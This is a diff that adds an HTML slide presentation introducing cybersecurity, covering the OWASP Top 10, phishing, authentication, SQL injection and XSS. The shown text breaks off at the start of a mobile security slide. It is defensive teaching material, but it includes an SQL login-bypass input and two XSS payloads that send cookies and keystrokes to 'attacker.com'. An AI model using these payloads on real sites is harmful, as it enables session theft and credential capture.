@@ -1,0 +1,1355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Security Introduction - Retro Edition</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=VT323&family=Press+Start+2P&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background: linear-gradient(135deg, #0f3460 0%, #16213e 50%, #1a1a2e 100%);
+            overflow: hidden;
+        }
+
+        .presentation-container {
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .slide {
+            background: #fff8e7;
+            width: 90%;
+            max-width: 1200px;
+            height: 85vh;
+            max-height: 675px;
+            border: 8px solid #ff6b35;
+            box-shadow:
+                0 0 0 4px #f7931e,
+                0 0 0 8px #fdc500,
+                0 20px 60px rgba(0, 0, 0, 0.5);
+            padding: 30px 50px;
+            display: none;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .slide.active {
+            display: flex;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(50px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0) scale(1);
+            }
+        }
+
+        .slide-header {
+            border-bottom: 5px double #e94560;
+            padding-bottom: 12px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            background: linear-gradient(90deg, rgba(233, 69, 96, 0.1) 0%, transparent 100%);
+            padding: 8px;
+            margin: -8px -8px 18px -8px;
+            flex-shrink: 0;
+        }
+
+        .header-icon {
+            height: 55px;
+            width: 55px;
+            object-fit: contain;
+            filter: drop-shadow(2px 2px 0px rgba(233, 69, 96, 0.3));
+        }
+
+        .slide-title {
+            font-size: 30px;
+            color: #0f3460;
+            font-weight: bold;
+            flex: 1;
+            text-shadow: 2px 2px 0px rgba(233, 69, 96, 0.2);
+            letter-spacing: -0.5px;
+        }
+
+        .slide-content {
+            flex: 1;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            padding-right: 8px;
+            min-height: 0;
+        }
+
+        .slide-content ul {
+            list-style: none;
+            padding: 0;
+            margin: 0 0 12px 0;
+        }
+
+        .slide-content li {
+            font-size: 16px;
+            color: #1a1a2e;
+            margin-bottom: 11px;
+            padding-left: 35px;
+            position: relative;
+            line-height: 1.45;
+            background: linear-gradient(90deg, rgba(253, 197, 0, 0.1) 0%, transparent 100%);
+            padding: 7px 7px 7px 35px;
+            border-left: 3px solid #fdc500;
+        }
+
+        .slide-content li:before {
+            content: "▶";
+            position: absolute;
+            left: 10px;
+            color: #e94560;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .icon-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin: 12px 0;
+        }
+
+        .icon-item {
+            text-align: center;
+            padding: 10px;
+            background: #16213e;
+            border: 3px solid #ff6b35;
+            box-shadow: 3px 3px 0px #fdc500;
+            transition: all 0.2s;
+        }
+
+        .icon-item:hover {
+            transform: translate(-2px, -2px);
+            box-shadow: 5px 5px 0px #fdc500;
+            background: #0f3460;
+        }
+
+        .icon-item img {
+            height: 55px;
+            width: 55px;
+            object-fit: contain;
+            margin-bottom: 6px;
+            filter: brightness(1.2);
+        }
+
+        .icon-item span {
+            display: block;
+            font-size: 11px;
+            color: #fdc500;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .code-block {
+            background: #16213e;
+            color: #4ecca3;
+            padding: 12px 15px;
+            border: 3px solid #ff6b35;
+            box-shadow: 3px 3px 0px rgba(253, 197, 0, 0.5);
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            margin: 10px 0;
+            overflow-x: auto;
+            position: relative;
+        }
+
+        .code-block:before {
+            content: ">> CODE";
+            position: absolute;
+            top: -11px;
+            left: 10px;
+            background: #e94560;
+            color: #fff8e7;
+            padding: 2px 7px;
+            font-size: 10px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        .warning-box {
+            background: #ffe5e5;
+            border: 3px solid #e94560;
+            box-shadow: 4px 4px 0px rgba(233, 69, 96, 0.3);
+            padding: 10px 12px;
+            margin: 10px 0;
+            font-size: 15px;
+            position: relative;
+        }
+
+        .warning-box:before {
+            content: "WARNING";
+            position: absolute;
+            top: -12px;
+            left: 12px;
+            background: #e94560;
+            color: #fff8e7;
+            padding: 2px 8px;
+            font-size: 11px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        .info-box {
+            background: #e3f2fd;
+            border: 3px solid #4ecca3;
+            box-shadow: 4px 4px 0px rgba(78, 204, 163, 0.3);
+            padding: 10px 12px;
+            margin: 10px 0;
+            font-size: 15px;
+            position: relative;
+        }
+
+        .info-box:before {
+            content: "INFO";
+            position: absolute;
+            top: -12px;
+            left: 12px;
+            background: #4ecca3;
+            color: #0f3460;
+            padding: 2px 8px;
+            font-size: 11px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        .tip-box {
+            background: #fff9e6;
+            border: 3px solid #fdc500;
+            box-shadow: 4px 4px 0px rgba(253, 197, 0, 0.3);
+            padding: 10px 12px;
+            margin: 10px 0;
+            font-size: 15px;
+            position: relative;
+        }
+
+        .tip-box:before {
+            content: "TIP";
+            position: absolute;
+            top: -12px;
+            left: 12px;
+            background: #fdc500;
+            color: #0f3460;
+            padding: 2px 8px;
+            font-size: 11px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        .slide-footer {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-top: 10px;
+            padding-top: 8px;
+            border-top: 4px double #ff6b35;
+            flex-shrink: 0;
+            background: linear-gradient(90deg, rgba(255, 107, 53, 0.1) 0%, transparent 50%, rgba(253, 197, 0, 0.1) 100%);
+            margin-left: -8px;
+            margin-right: -8px;
+            padding-left: 8px;
+            padding-right: 8px;
+            padding-bottom: 8px;
+        }
+
+        .slide-number {
+            color: #e94560;
+            font-size: 14px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+
+        .navigation {
+            display: flex;
+            gap: 10px;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .nav-button {
+            background: #e94560;
+            color: #fff8e7;
+            border: 3px solid #ff6b35;
+            box-shadow: 2px 2px 0px #fdc500;
+            padding: 6px 14px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: bold;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .nav-button:hover {
+            background: #ff6b35;
+            transform: translate(-1px, -1px);
+            box-shadow: 3px 3px 0px #fdc500;
+        }
+
+        .nav-button:active {
+            transform: translate(1px, 1px);
+            box-shadow: 1px 1px 0px #fdc500;
+        }
+
+        .nav-button:disabled {
+            background: #888;
+            border-color: #666;
+            box-shadow: 3px 3px 0px #555;
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+
+        .title-slide {
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            background: #0f3460;
+            color: #fff8e7;
+            border-color: #fdc500;
+        }
+
+        .title-slide .slide-title {
+            font-size: 46px;
+            color: #fdc500;
+            margin-bottom: 18px;
+            text-shadow:
+                3px 3px 0px #e94560,
+                6px 6px 0px rgba(233, 69, 96, 0.5);
+            letter-spacing: -1px;
+        }
+
+        .title-slide .slide-subtitle {
+            font-size: 22px;
+            color: #ff6b35;
+            text-shadow: 2px 2px 0px rgba(0, 0, 0, 0.3);
+        }
+
+        .title-icon {
+            height: 130px;
+            width: 130px;
+            object-fit: contain;
+            margin-bottom: 25px;
+            filter: drop-shadow(5px 5px 0px rgba(253, 197, 0, 0.5));
+        }
+
+        .highlight {
+            background: #fdc500;
+            padding: 2px 8px;
+            color: #0f3460;
+            font-weight: bold;
+            border: 2px solid #ff6b35;
+            box-shadow: 2px 2px 0px rgba(233, 69, 96, 0.3);
+        }
+
+        .two-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 8px;
+        }
+
+        .three-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 12px;
+            margin-top: 8px;
+        }
+
+        .column {
+            background: linear-gradient(135deg, rgba(78, 204, 163, 0.1) 0%, rgba(253, 197, 0, 0.1) 100%);
+            padding: 12px;
+            border: 3px solid #ff6b35;
+            box-shadow: 3px 3px 0px rgba(253, 197, 0, 0.3);
+        }
+
+        .column h3 {
+            color: #e94560;
+            margin-bottom: 10px;
+            font-size: 19px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding-bottom: 6px;
+            border-bottom: 3px solid #fdc500;
+        }
+
+        .column h3 img {
+            height: 32px;
+            width: 32px;
+            object-fit: contain;
+        }
+
+        .column ul {
+            margin-top: 8px;
+        }
+
+        .column li {
+            font-size: 14px;
+            margin-bottom: 8px;
+            padding: 5px 5px 5px 30px;
+        }
+
+        .owasp-item {
+            background: rgba(233, 69, 96, 0.05);
+            border-left: 3px solid #e94560;
+            padding: 8px 10px;
+            margin-bottom: 8px;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .owasp-item strong {
+            color: #e94560;
+            display: block;
+            margin-bottom: 3px;
+        }
+
+        .progress-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 7px;
+            background: linear-gradient(90deg, #e94560 0%, #ff6b35 50%, #fdc500 100%);
+            transition: width 0.3s;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(233, 69, 96, 0.5);
+        }
+
+        .content-with-icon {
+            display: flex;
+            gap: 18px;
+            align-items: flex-start;
+        }
+
+        .content-with-icon img {
+            height: 100px;
+            width: 100px;
+            object-fit: contain;
+            flex-shrink: 0;
+            filter: drop-shadow(3px 3px 0px rgba(233, 69, 96, 0.3));
+        }
+
+        .stats-box {
+            background: #16213e;
+            color: #fdc500;
+            padding: 8px 10px;
+            border: 3px solid #ff6b35;
+            box-shadow: 3px 3px 0px rgba(233, 69, 96, 0.3);
+            margin: 8px 0;
+            text-align: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .stats-box .big-number {
+            font-size: 26px;
+            color: #e94560;
+            display: block;
+            margin: 5px 0;
+            text-shadow: 2px 2px 0px rgba(253, 197, 0, 0.5);
+        }
+
+        .compact-list {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #0f3460;
+            background: rgba(78, 204, 163, 0.05);
+            border-left: 4px solid #4ecca3;
+            padding: 10px 12px;
+            margin: 8px 0;
+        }
+
+        .compact-list strong {
+            color: #e94560;
+            display: block;
+            margin-bottom: 6px;
+        }
+    </style>
+</head>
+<body>
+    <div class="progress-bar" id="progressBar"></div>
+    <div class="presentation-container">
+
+        <!-- Slide 1: Title -->
+        <div class="slide active title-slide">
+            <img src="Icons/cyber-security-shield-padlock-black-outline-22822.png" alt="Security Shield" class="title-icon">
+            <h1 class="slide-title">CYBER SECURITY INTRODUCTION</h1>
+            <p class="slide-subtitle">Understanding Common Attacks and Defense Strategies</p>
+            <p style="margin-top: 35px; font-size: 19px; opacity: 0.9; color: #4ecca3;">A Comprehensive Deep-Dive into Cybersecurity</p>
+            <p style="margin-top: 18px; font-size: 15px; opacity: 0.7; color: #fdc500;">Protecting Your Digital Assets in the Modern Era</p>
+        </div>
+
+        <!-- Slide 2: What is Cybersecurity -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-system-network-22964.png" alt="Cyber Security Network" class="header-icon">
+                <h1 class="slide-title">What is Cybersecurity?</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li><strong>Cybersecurity</strong> is the practice of protecting systems, networks, and data from digital attacks and unauthorized access</li>
+                    <li><strong>Web applications</strong> are software accessed through browsers like Gmail, Facebook, banking sites, and online stores</li>
+                    <li>Web apps handle sensitive information: passwords, credit cards, personal data, and business secrets</li>
+                    <li>Understanding vulnerabilities helps developers build secure applications from the ground up</li>
+                </ul>
+                <div class="stats-box">
+                    <span>Projected Global Cybercrime Cost</span>
+                    <span class="big-number">$10.5 Trillion</span>
+                    <span>Annual by 2025</span>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 01 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 3: Why Security Matters -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/hacker-threat-computer-cyber-security-22937.png" alt="Hacker Threat" class="header-icon">
+                <h1 class="slide-title">Why Security Matters</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li><strong>Data breaches</strong> expose personal information leading to identity theft and fraud</li>
+                    <li><strong>Financial losses</strong> include theft, ransoms, restoration costs, and regulatory fines</li>
+                    <li><strong>Reputational damage</strong> destroys customer trust and competitive advantage</li>
+                    <li><strong>Legal consequences</strong> include GDPR fines (€20M or 4% revenue) and lawsuits</li>
+                </ul>
+                <div class="warning-box">
+                    <span><strong>CRITICAL:</strong> Average data breach cost is $4.45M in 2024, with mega-breaches exceeding $150M</span>
+                </div>
+                <div class="info-box">
+                    <span><strong>FACT:</strong> It takes an average of 277 days to identify and contain a data breach—nearly 9 months for attackers to exploit your systems.</span>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 02 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 4: Real-World Breaches -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/database-security-2358.png" alt="Data Breaches" class="header-icon">
+                <h1 class="slide-title">Real-World Impact</h1>
+            </div>
+            <div class="slide-content">
+                <div class="compact-list">
+                    <strong>Major Security Breaches:</strong>
+                    <span class="highlight">Equifax (2017)</span> - 147M records exposed, $700M settlement<br>
+                    <span class="highlight">Capital One (2019)</span> - 100M customers affected, $190M penalty<br>
+                    <span class="highlight">Marriott (2018)</span> - 500M guest records stolen, $24M fine<br>
+                    <span class="highlight">Target (2013)</span> - 40M credit cards compromised, $18.5M settlement
+                </div>
+                <div class="info-box">
+                    <span>Prevention is exponentially more cost-effective than dealing with breaches and their aftermath</span>
+                </div>
+                <div class="tip-box">
+                    <span><strong>SHOCKING STAT:</strong> 60% of small businesses close within 6 months after experiencing a cyberattack due to financial and reputational damage.</span>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 03 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 5: OWASP Top 10 -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/hacker-laptop-cyber-security-22936.png" alt="Threats" class="header-icon">
+                <h1 class="slide-title">OWASP Top 10 Threats</h1>
+            </div>
+            <div class="slide-content">
+                <div class="three-column">
+                    <div>
+                        <div class="owasp-item">
+                            <strong>1. Broken Access Control</strong>
+                            Users accessing unauthorized functionality and data
+                        </div>
+                        <div class="owasp-item">
+                            <strong>2. Cryptographic Failures</strong>
+                            Weak encryption exposing sensitive data
+                        </div>
+                        <div class="owasp-item">
+                            <strong>3. Injection</strong>
+                            SQL, NoSQL, LDAP, OS command injection attacks
+                        </div>
+                        <div class="owasp-item">
+                            <strong>4. Insecure Design</strong>
+                            Architectural flaws and missing security controls
+                        </div>
+                    </div>
+                    <div>
+                        <div class="owasp-item">
+                            <strong>5. Security Misconfiguration</strong>
+                            Default settings, verbose errors, unnecessary features
+                        </div>
+                        <div class="owasp-item">
+                            <strong>6. Vulnerable Components</strong>
+                            Using outdated libraries with known vulnerabilities
+                        </div>
+                        <div class="owasp-item">
+                            <strong>7. Authentication Failures</strong>
+                            Weak credential management and session handling
+                        </div>
+                        <div class="owasp-item">
+                            <strong>8. Software Integrity</strong>
+                            CI/CD pipeline compromises and untrusted updates
+                        </div>
+                    </div>
+                    <div>
+                        <div class="owasp-item">
+                            <strong>9. Logging Failures</strong>
+                            Insufficient monitoring and incident detection
+                        </div>
+                        <div class="owasp-item">
+                            <strong>10. SSRF</strong>
+                            Server-Side Request Forgery attacks on internal resources
+                        </div>
+                        <div class="info-box" style="margin-top: 8px; font-size: 13px; padding: 8px 10px;">
+                            <span>Updated every 3-4 years based on comprehensive security data from organizations worldwide</span>
+                        </div>
+                        <div class="warning-box" style="margin-top: 8px; font-size: 13px; padding: 8px 10px;">
+                            <span><strong>DEVELOPER ALERT:</strong> 94% of successful cyberattacks exploit vulnerabilities that are 2-4 years old—patching known issues is critical!</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 04 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 6: SQL Injection Intro -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/database-security-and-shield-20254.png" alt="SQL" class="header-icon">
+                <h1 class="slide-title">SQL Injection Explained</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li><strong>SQL (Structured Query Language)</strong> is the standard language for managing relational databases like MySQL, PostgreSQL, Oracle, and Microsoft SQL Server</li>
+                    <li>Databases store all critical application data: user accounts, hashed passwords, credit card information, business records, and confidential documents</li>
+                    <li><strong>SQL Injection</strong> occurs when attackers insert malicious SQL code fragments into application input fields, forms, URLs, or cookies</li>
+                    <li>Exploits poor input validation and dynamic query construction, tricking the database into executing unintended commands with the application's privileges</li>
+                    <li>Ranked #3 in OWASP Top 10—one of the oldest and most dangerous vulnerabilities, yet still prevalent in modern applications</li>
+                </ul>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 05 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 7: SQL Injection Attack -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/user-browser-login-11947.png" alt="Login" class="header-icon">
+                <h1 class="slide-title">SQL Injection Attack</h1>
+            </div>
+            <div class="slide-content">
+                <p style="font-size: 16px; margin-bottom: 8px; color: #e94560; font-weight: bold;">Login Authentication Bypass</p>
+
+                <div class="compact-list">
+                    <strong>Normal Query:</strong>
+                    SELECT * FROM users WHERE username='john' AND password='pass123'
+                </div>
+
+                <div class="compact-list">
+                    <strong>Attack Input:</strong>
+                    Username: <span class="highlight">admin' --</span><br>
+                    The single quote closes the string, double dash comments out the rest
+                </div>
+
+                <div class="compact-list">
+                    <strong>Resulting Query:</strong>
+                    SELECT * FROM users WHERE username='admin' --' AND password='x'<br>
+                    Password check is ignored! Attacker logs in as admin without password
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 06 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 8: SQL Injection Defense -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/secure-1498.png" alt="Defense" class="header-icon">
+                <h1 class="slide-title">SQL Injection Defense</h1>
+            </div>
+            <div class="slide-content">
+                <div class="code-block">
+# VULNERABLE - String Concatenation
+query = "SELECT * FROM users WHERE username='" + user + "'"
+
+# SECURE - Prepared Statements (Parameterized Queries)
+query = "SELECT * FROM users WHERE username=?"
+cursor.execute(query, (user,))
+                </div>
+                <ul>
+                    <li><strong>Prepared Statements:</strong> Separate SQL code from data—user input bound as parameter, cannot alter SQL syntax</li>
+                    <li><strong>Input Validation:</strong> Whitelist expected formats, reject suspicious patterns, validate data types</li>
+                    <li><strong>Least Privilege:</strong> Grant minimal database permissions—read-only when possible</li>
+                    <li><strong>ORM Frameworks:</strong> SQLAlchemy, Hibernate, Entity Framework handle parameterization automatically</li>
+                    <li><strong>Error Handling:</strong> Never expose SQL error messages—they reveal database structure</li>
+                </ul>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 07 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 9: Authentication & Authorization -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-fingerprint-safety-shield-23030.png" alt="Auth" class="header-icon">
+                <h1 class="slide-title">Authentication & Authorization</h1>
+            </div>
+            <div class="slide-content">
+                <div class="two-column">
+                    <div class="column">
+                        <h3>
+                            <img src="Icons/cyber-security-id-card-protection-privacy-22950.png" alt="ID">
+                            Authentication
+                        </h3>
+                        <ul>
+                            <li><strong>Identity verification</strong> - proving you are who you claim to be</li>
+                            <li><strong>Passwords</strong> - weakest method, vulnerable to guessing and leaks</li>
+                            <li><strong>Multi-Factor (MFA)</strong> - combines multiple verification methods (something you know + have + are)</li>
+                            <li><strong>Biometrics</strong> - fingerprints, face ID, retina scans</li>
+                            <li><strong>Tokens</strong> - JWT, OAuth, SAML for stateless authentication</li>
+                            <li><strong>Hardware keys</strong> - YubiKey, security keys (most secure)</li>
+                        </ul>
+                    </div>
+                    <div class="column">
+                        <h3>
+                            <img src="Icons/hotel-room-smart-key-card-15745.png" alt="Access">
+                            Authorization
+                        </h3>
+                        <ul>
+                            <li><strong>Access control</strong> - what authenticated users can do and access</li>
+                            <li><strong>Role-Based (RBAC)</strong> - permissions assigned to roles (admin, user, guest)</li>
+                            <li><strong>Access Control Lists</strong> - per-resource permission definitions</li>
+                            <li><strong>Least Privilege</strong> - grant minimum necessary permissions</li>
+                            <li><strong>Zero Trust</strong> - never trust, always verify every access request</li>
+                            <li><strong>Attribute-Based</strong> - dynamic permissions based on context</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 08 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 10: Email Threats -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-mail-phishing-threat-22972.png" alt="Phishing" class="header-icon">
+                <h1 class="slide-title">Email-Based Threats</h1>
+            </div>
+            <div class="slide-content">
+                <div class="two-column">
+                    <div class="column">
+                        <h3>
+                            <img src="Icons/cyber-security-mail-phishing-threat-22972.png" alt="Phishing">
+                            Phishing Attacks
+                        </h3>
+                        <ul>
+                            <li><strong>General Phishing</strong> - mass emails impersonating banks, government agencies, or popular services to steal credentials</li>
+                            <li><strong>Spear Phishing</strong> - targeted attacks on specific individuals using personalized information gathered from social media</li>
+                            <li><strong>Whaling</strong> - attacks targeting executives and high-value individuals (CEOs, CFOs) with sophisticated social engineering</li>
+                            <li><strong>Business Email Compromise (BEC)</strong> - impersonating company executives to authorize fraudulent wire transfers</li>
+                        </ul>
+                    </div>
+                    <div class="column">
+                        <h3>
+                            <img src="Icons/cyber-security-mail-threats-virus-malware-22951.png" alt="Malware">
+                            Other Email Threats
+                        </h3>
+                        <ul>
+                            <li><strong>Malware Distribution</strong> - malicious attachments (.exe, .zip, macros in Office docs) that install ransomware, trojans, or keyloggers</li>
+                            <li><strong>Email Spoofing</strong> - forging sender addresses to appear legitimate, bypassing trust filters</li>
+                            <li><strong>Link Manipulation</strong> - hiding malicious URLs behind legitimate-looking anchor text or shortened links</li>
+                            <li><strong>Credential Harvesting</strong> - fake login pages that capture usernames and passwords</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="warning-box" style="margin-top: 10px;">
+                    <span><strong>SHOCKING REALITY:</strong> 90% of successful cyberattacks start with a phishing email. Email is the #1 attack vector because it exploits human psychology rather than technical vulnerabilities—making it consistently effective.</span>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 09 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 11: Phishing Detection -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-mail-phishing-threat-22972.png" alt="Detection" class="header-icon">
+                <h1 class="slide-title">Phishing Detection & Prevention</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li><strong>Urgency and pressure:</strong> "Act now!" or "Account suspended!" messages bypass critical thinking</li>
+                    <li><strong>Suspicious sender addresses:</strong> Domain misspellings (amazn.com vs amazon.com), free email for business</li>
+                    <li><strong>Generic greetings:</strong> "Dear Customer" instead of your name</li>
+                    <li><strong>Poor writing quality:</strong> Spelling errors, grammar mistakes</li>
+                    <li><strong>Unexpected attachments:</strong> Unsolicited files (.exe, .zip) or shortened URLs</li>
+                </ul>
+                <div class="compact-list">
+                    <strong>Protection:</strong>
+                    Hover over links • Verify sender • Use email filters • Enable MFA • Report suspicious emails
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 10 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 12: XSS Introduction -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/xss-attack-black-lineal-16976.png" alt="XSS" class="header-icon">
+                <h1 class="slide-title">Cross-Site Scripting (XSS)</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
+                    <li><strong>HTML Injection:</strong> Inserting unauthorized HTML markup to modify page structure</li>
+                    <li><strong>XSS (Cross-Site Scripting):</strong> Injects malicious JavaScript executing in victims' browsers</li>
+                    <li>Unlike SQL injection (server-side), XSS attacks execute client-side in the browser</li>
+                    <li>Can steal cookies, redirect to phishing sites, modify content, capture keystrokes</li>
+                </ul>
+                <div class="compact-list">
+                    <strong>Three XSS Types:</strong>
+                    <span class="highlight">Stored XSS</span> - Script stored on server, served to all users<br>
+                    <span class="highlight">Reflected XSS</span> - Script in URL reflected back without validation<br>
+                    <span class="highlight">DOM-based XSS</span> - Client-side JavaScript improperly handles input
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 11 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 13: XSS Attack Examples -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/xss-attack-and-browser-16979.png" alt="XSS Attack" class="header-icon">
+                <h1 class="slide-title">XSS Attack Examples</h1>
+            </div>
+            <div class="slide-content">
+                <div class="compact-list">
+                    <strong>Cookie Theft Attack:</strong>
+                    &lt;script&gt;fetch('attacker.com/steal?c=' + document.cookie);&lt;/script&gt;<br>
+                    Steals session cookies to impersonate victims
+                </div>
+
+                <div class="compact-list">
+                    <strong>Keylogger Attack:</strong>
+                    &lt;script&gt;document.addEventListener('keypress', e =&gt; fetch('attacker.com/log?k=' + e.key));&lt;/script&gt;<br>
+                    Records every keystroke including passwords
+                </div>
+
+                <div class="warning-box">
+                    <span>MySpace Samy worm (2005) infected 1M+ users in 24 hours using XSS</span>
+                </div>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 12 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 14: XSS Defense -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-shield-padlock-black-outline-22822.png" alt="Defense" class="header-icon">
+                <h1 class="slide-title">XSS Defense Strategies</h1>
+            </div>
+            <div class="slide-content">
+                <div class="code-block">
+// VULNERABLE - Direct HTML Insertion
+element.innerHTML = userInput;
+
+// SECURE - Text Content Only
+element.textContent = userInput;
+                </div>
+                <ul>
+                    <li><strong>Output Encoding:</strong> Convert dangerous characters to HTML entities—&lt; becomes &amp;lt;, &gt; becomes &amp;gt;</li>
+                    <li><strong>Content Security Policy (CSP):</strong> HTTP header defining trusted content sources, blocking inline scripts</li>
+                    <li><strong>Modern Frameworks:</strong> React, Vue, Angular auto-escape output by default</li>
+                    <li><strong>HTTPOnly Cookies:</strong> Prevents JavaScript from accessing session cookies via document.cookie</li>
+                    <li><strong>Input Validation:</strong> Reject suspicious patterns, use DOMPurify for HTML sanitization</li>
+                </ul>
+            </div>
+            <div class="slide-footer">
+                <div class="slide-number">SLIDE 13 / 24</div>
+                <div class="navigation">
+                    <button class="nav-button" onclick="prevSlide()">← PREV</button>
+                    <button class="nav-button" onclick="nextSlide()">NEXT →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 15: Mobile Security -->
+        <div class="slide">
+            <div class="slide-header">
+                <img src="Icons/cyber-security-smartphone-threats-warning-22963.png" alt="Mobile" class="header-icon">
+                <h1 class="slide-title">Mobile Device Security</h1>
+            </div>
+            <div class="slide-content">
+                <ul>
